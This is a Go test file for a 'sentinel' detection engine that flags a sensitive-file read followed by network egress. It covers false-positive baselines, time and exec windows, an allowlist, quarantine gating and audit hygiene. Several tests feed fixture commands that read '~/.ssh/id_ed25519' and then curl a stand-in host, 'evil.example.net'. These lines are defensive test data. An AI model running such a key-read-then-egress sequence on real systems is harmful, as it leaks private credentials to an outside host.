// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"context"
	"encoding/json"
	"log/slog"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// fireSink counts fired detections and captures the last record for hygiene
// assertions.
type fireSink struct {
	n    int
	last []byte
}

func (f *fireSink) Append(_, _ string, content []byte, _ bool) error {
	f.n++
	f.last = content
	return nil
}

// newTestEngine builds an enabled engine with a counting audit sink and a
// controllable clock, discarding logs.
func newTestEngine(t *testing.T, cfg Config, now func() time.Time) (*Engine, *fireSink) {
	t.Helper()
	cfg.Enabled = true
	sink := &fireSink{}
	e := NewEngine(cfg,
		WithAudit(sink),
		WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(now),
	)
	return e, sink
}

type corpusEvent struct {
	Method string   `json:"method"`
	Name   string   `json:"name"`
	Args   []string `json:"args"`
}

type corpusSession struct {
	Name        string        `json:"name"`
	ExpectFires int           `json:"expect_fires"`
	Events      []corpusEvent `json:"events"`
}

type corpus struct {
	Description string          `json:"description"`
	Sessions    []corpusSession `json:"sessions"`
}

func loadCorpus(t *testing.T, name string) corpus {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join("testdata", name))
	require.NoError(t, err)
	var c corpus
	require.NoError(t, json.Unmarshal(raw, &c))
	require.NotEmpty(t, c.Sessions, "corpus %s must not be empty", name)
	return c
}

// replaySession replays one session through a FRESH engine at a fixed clock and
// returns the number of fired detections.
func replaySession(s corpusSession) int {
	sink := &fireSink{}
	e := NewEngine(Config{Enabled: true},
		WithAudit(sink),
		WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return time.Unix(1_700_000_000, 0) }),
	)
	for _, ev := range s.Events {
		e.observe(context.Background(), ev.Method, ev.Name, ev.Args)
	}
	return sink.n
}

// TestSentinel_BenignBaseline_ZeroFP replays the shipped benign baseline corpus
// and MEASURES the false-positive rate. The rules must fire ZERO times. The
// number is computed here (not narrated) so the doc figure and the asserted
// figure cannot drift.
func TestSentinel_BenignBaseline_ZeroFP(t *testing.T) {
	c := loadCorpus(t, "benign_baseline.json")
	totalFires := 0
	totalEvents := 0
	var offenders []string
	for _, s := range c.Sessions {
		totalEvents += len(s.Events)
		fires := replaySession(s)
		totalFires += fires
		if fires != 0 {
			offenders = append(offenders, s.Name)
		}
	}
	fpRate := float64(totalFires) / float64(len(c.Sessions))
	t.Logf("MEASURED FALSE-POSITIVE RATE: %d fires across %d benign sessions / %d exec events = %.3f",
		totalFires, len(c.Sessions), totalEvents, fpRate)
	assert.Equal(t, 0, totalFires,
		"benign baseline must produce ZERO false positives; offending sessions: %v", offenders)
}

// TestSentinel_ExfilPattern_Fires replays the positive corpus and asserts each
// ordered exfil sequence fires exactly its expected count — proving non-vacuous
// recall on the naive/opportunistic case.
func TestSentinel_ExfilPattern_Fires(t *testing.T) {
	c := loadCorpus(t, "exfil_positive.json")
	for _, s := range c.Sessions {
		s := s
		t.Run(s.Name, func(t *testing.T) {
			want := s.ExpectFires
			if want == 0 {
				want = 1
			}
			assert.Equal(t, want, replaySession(s),
				"exfil session %q must fire exactly %d time(s)", s.Name, want)
		})
	}
}

// fixedClock returns a clock that advances by step on each call.
func fixedClock(start time.Time, step time.Duration) func() time.Time {
	cur := start
	first := true
	return func() time.Time {
		if first {
			first = false
			return cur
		}
		cur = cur.Add(step)
		return cur
	}
}

// TestSentinel_WindowExecBoundary: read then egress at exactly N execs fires;
// at N+1 execs it does not (the exec-distance guard).
func TestSentinel_WindowExecBoundary(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	// At the boundary: read at seq1, egress at seq6 => distance 5 == default N.
	e, sink := newTestEngine(t, Config{}, func() time.Time { return base })
	ctx := context.Background()
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"}) // seq1
	for i := 0; i < 4; i++ {
		e.observe(ctx, "Run", "echo", []string{"x"}) // seq2..5
	}
	e.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"}) // seq6, distance 5
	assert.Equal(t, 1, sink.n, "egress at N execs after the read must fire")

	// Beyond the boundary: read at seq1, egress at seq7 => distance 6 > N.
	e2, sink2 := newTestEngine(t, Config{}, func() time.Time { return base })
	e2.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"}) // seq1
	for i := 0; i < 5; i++ {
		e2.observe(ctx, "Run", "echo", []string{"x"}) // seq2..6
	}
	e2.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"}) // seq7, distance 6
	assert.Equal(t, 0, sink2.n, "egress at N+1 execs after the read must NOT fire")
}

// TestSentinel_WindowTimeBoundary: read then egress at T+1s does not fire even
// when the exec distance is within N (the wall-clock guard).
func TestSentinel_WindowTimeBoundary(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	// Clock: read at base, egress at base + (T+1s). Distance in execs is 1.
	clk := fixedClock(base, time.Duration(DefaultWindowSeconds+1)*time.Second)
	e, sink := newTestEngine(t, Config{}, clk)
	ctx := context.Background()
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})           // t=base
	e.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"}) // t=base+61s
	assert.Equal(t, 0, sink.n, "egress beyond the time window must NOT fire")
}

// TestSentinel_AllowlistEdge: read then egress to a *.ts.net tailnet host does
// not fire (the benign-egress allowlist).
func TestSentinel_AllowlistEdge(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	e, sink := newTestEngine(t, Config{}, func() time.Time { return base })
	ctx := context.Background()
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})
	e.observe(ctx, "Run", "scp", []string{"/tmp/k", "buildhost.abc.ts.net:/tmp/"})
	assert.Equal(t, 0, sink.n, "egress to an allowlisted tailnet host must NOT fire")
}

// TestSentinel_EitherLegAloneNeverFires: a lone read and a lone egress each fire
// nothing.
func TestSentinel_EitherLegAloneNeverFires(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	ctx := context.Background()

	eRead, sRead := newTestEngine(t, Config{}, func() time.Time { return base })
	eRead.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})
	assert.Equal(t, 0, sRead.n, "a lone sensitive read must not fire")

	eEgr, sEgr := newTestEngine(t, Config{}, func() time.Time { return base })
	eEgr.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"})
	assert.Equal(t, 0, sEgr.n, "a lone external egress must not fire")
}

// TestSentinel_OrderingMatters: egress THEN read (wrong order) never fires.
func TestSentinel_OrderingMatters(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	e, sink := newTestEngine(t, Config{}, func() time.Time { return base })
	ctx := context.Background()
	e.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"})
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})
	assert.Equal(t, 0, sink.n, "egress-before-read (wrong order) must not fire")
}

// TestSentinel_Disabled_NoOp: a disabled engine never fires and Enabled reports
// false; a nil engine is nil-receiver safe.
func TestSentinel_Disabled_NoOp(t *testing.T) {
	sink := &fireSink{}
	e := NewEngine(Config{Enabled: false}, WithAudit(sink), WithLogger(slog.New(slog.DiscardHandler)))
	assert.False(t, e.Enabled())
	e.observe(context.Background(), "Run", "cat", []string{"~/.ssh/id_ed25519"})
	e.observe(context.Background(), "Run", "curl", []string{"https://evil.example.net/x"})
	assert.Equal(t, 0, sink.n)

	var nilEng *Engine
	assert.False(t, nilEng.Enabled())
	nilEng.observe(context.Background(), "Run", "cat", []string{"~/.ssh/id_ed25519"}) // must not panic
}

// TestSentinel_QuarantineGating: the Tier-1 hook is invoked only when quarantine
// is enabled AND a hook is wired; a fired detection with quarantine off never
// invokes it; a nil hook with quarantine on is tolerated.
func TestSentinel_QuarantineGating(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	ctx := context.Background()
	exfil := func(e *Engine) {
		e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})
		e.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"})
	}

	// Quarantine ON + hook wired: hook invoked with the reason.
	called := 0
	var gotReason string
	e1 := NewEngine(Config{Enabled: true, Quarantine: true},
		WithAudit(&fireSink{}), WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return base }),
		WithQuarantine(func(_ context.Context, reason string) error { called++; gotReason = reason; return nil }),
	)
	exfil(e1)
	e1.waitQuarantine() // quarantine is dispatched off the exec hot path (T-27-17)
	assert.Equal(t, 1, called, "quarantine hook must be invoked on a fired detection when enabled")
	assert.Equal(t, SentinelReason, gotReason)

	// Quarantine OFF: hook never invoked even though the detection fires.
	called = 0
	sink := &fireSink{}
	e2 := NewEngine(Config{Enabled: true, Quarantine: false},
		WithAudit(sink), WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return base }),
		WithQuarantine(func(_ context.Context, _ string) error { called++; return nil }),
	)
	exfil(e2)
	assert.Equal(t, 1, sink.n, "detection must still fire (Tier 0) with quarantine off")
	assert.Equal(t, 0, called, "quarantine hook must NOT be invoked when quarantine is off")

	// Quarantine ON + nil hook: tolerated (flag+audit only), no panic.
	e3 := NewEngine(Config{Enabled: true, Quarantine: true},
		WithAudit(&fireSink{}), WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return base }),
	)
	exfil(e3) // must not panic
}

// TestSentinel_AuditHygiene: the hash-only detection record carries generic
// labels only — never the raw sensitive path or the egress host.
func TestSentinel_AuditHygiene(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	e, sink := newTestEngine(t, Config{}, func() time.Time { return base })
	ctx := context.Background()
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519_secret"})
	e.observe(ctx, "Run", "curl", []string{"https://very-secret-host.evil.example/x"})
	require.Equal(t, 1, sink.n)

	blob := string(sink.last)
	assert.NotContains(t, blob, "very-secret-host", "audit record must not carry the egress host")
	assert.NotContains(t, blob, "id_ed25519_secret", "audit record must not carry the raw sensitive path")
	var rec detectionRecord
	require.NoError(t, json.Unmarshal(sink.last, &rec))
	assert.Equal(t, "cat", rec.ReadBinary)
	assert.Equal(t, "ssh-key-store", rec.ReadCategory)
	assert.Equal(t, "curl", rec.EgressBinary)
	assert.Equal(t, "non-allowlisted-host", rec.EgressTarget)
}

// TestSentinel_AuditFailureIsLoudNotSilent: an Append error does not suppress
// the detection (fail-loud) and does not block; quarantine still runs.
func TestSentinel_AuditFailureIsLoudNotSilent(t *testing.T) {
	base := time.Unix(1_700_000_000, 0)
	called := 0
	e := NewEngine(Config{Enabled: true, Quarantine: true},
		WithAudit(erroringAppender{}),
		WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return base }),
		WithQuarantine(func(_ context.Context, _ string) error { called++; return nil }),
	)
	ctx := context.Background()
	e.observe(ctx, "Run", "cat", []string{"~/.ssh/id_ed25519"})
	e.observe(ctx, "Run", "curl", []string{"https://evil.example.net/x"})
	e.waitQuarantine() // quarantine is dispatched off the exec hot path (T-27-17)
	assert.Equal(t, 1, called, "a Tier-0 audit failure must not suppress Tier-1 quarantine (fail-loud)")
}

type erroringAppender struct{}

func (erroringAppender) Append(_, _ string, _ []byte, _ bool) error {
	return assertErr
}

var assertErr = errAppend("boom")

type errAppend string

func (e errAppend) Error() string { return string(e) }

// TestSelfTest_Passes: the embedded doctor self-test holds on the shipped rules.
func TestSelfTest_Passes(t *testing.T) {
	require.NoError(t, SelfTest(context.Background()))
}
